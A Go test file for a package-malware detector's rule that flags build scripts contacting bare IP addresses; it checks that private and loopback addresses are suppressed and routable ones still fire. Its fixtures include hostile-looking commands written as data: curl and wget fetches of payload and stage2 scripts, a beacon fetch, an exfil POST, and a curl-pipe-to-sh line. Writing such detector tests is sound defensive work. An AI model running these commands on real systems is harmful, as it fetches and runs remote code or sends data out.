package detect

import "testing"

// P-RAW-IP-URL was the SOLE evidence for 742 malware mints across packagist, pypi,
// go and cargo (production, 2026-08-07). Its point is "this package talks to a bare
// address instead of a hostname", which only means anything when the address could
// actually be a C2 — a loopback dev server, a LAN address or an RFC-5737
// documentation block is ordinary source.

// P-RAW-IP-URL is pkgbuild_only, so the rule is skipped entirely unless the content
// is PKGBUILD-shaped. Wrapping each case keeps the tests exercising the suppression
// rather than the section gate.
func pkgbuildWith(line string) string {
	return "pkgname=demo\npkgver=1.0\nbuild() {\n  " + line + "\n}\n"
}

func TestRawIPURLSuppressedForNonRoutable(t *testing.T) {
	quiet := map[string]string{
		"loopback":       `const api = "http://127.0.0.1:8080/health";`,
		"bind any":       `server.listen("http://0.0.0.0:3000");`,
		"rfc1918 16":     `proxy = "http://192.168.1.10:3128"`,
		"rfc1918 8":      `endpoint: http://10.0.0.5/metrics`,
		"rfc1918 12":     `url = "http://172.16.4.9/api"`,
		"link local":     `metadata = "http://169.254.169.254/latest"`,
		"documentation":  `// example: http://192.0.2.1/callback`,
		"documentation2": `see http://203.0.113.7/docs for details`,
	}
	for name, line := range quiet {
		t.Run("quiet/"+name, func(t *testing.T) {
			f := Detect(&PackageContext{Name: "pkg", PkgbuildContent: pkgbuildWith(line)})
			if has(f, "P-RAW-IP-URL") {
				t.Errorf("P-RAW-IP-URL fired on non-routable %q", line)
			}
		})
	}
}

func TestRawIPURLStillFiresForRoutable(t *testing.T) {
	loud := map[string]string{
		"plain routable": `curl http://185.100.157.127/payload.sh`,
		"https routable": `fetch("https://45.33.32.156/beacon")`,
		"high octets":    `POST http://203.0.114.9/exfil`,
		"low octets":     `wget http://11.22.33.44/stage2`,
	}
	for name, line := range loud {
		t.Run("fires/"+name, func(t *testing.T) {
			f := Detect(&PackageContext{Name: "pkg", PkgbuildContent: pkgbuildWith(line)})
			if !has(f, "P-RAW-IP-URL") {
				t.Errorf("P-RAW-IP-URL did not fire on routable %q", line)
			}
		})
	}
}

// The suppression must be scoped to this one rule — a helper that keyed off the
// line alone would silently mute every other rule that happens to quote a loopback
// address.
func TestRawIPSuppressionIsScopedToItsRule(t *testing.T) {
	if suppressNonRoutableIPURL("P-CURL-PIPE", "curl http://127.0.0.1/x | sh") {
		t.Error("suppression applied to a rule other than P-RAW-IP-URL")
	}
	if !suppressNonRoutableIPURL("P-RAW-IP-URL", "http://127.0.0.1/x") {
		t.Error("suppression did not apply to its own rule")
	}
	if suppressNonRoutableIPURL("P-RAW-IP-URL", "no address on this line") {
		t.Error("suppression fired on a line with no address; it must keep the finding")
	}
}
